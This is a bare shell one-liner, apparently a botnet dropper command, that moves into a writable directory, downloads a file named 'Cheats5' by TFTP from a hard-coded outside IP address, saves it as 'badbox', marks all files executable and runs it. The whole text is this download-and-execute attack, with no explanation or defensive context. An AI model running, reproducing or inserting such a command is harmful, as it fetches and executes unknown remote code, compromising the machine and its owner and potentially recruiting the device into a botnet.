cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats5 -g 5.152.211.70;cat Cheats5 >badbox;chmod +x *;./badbox
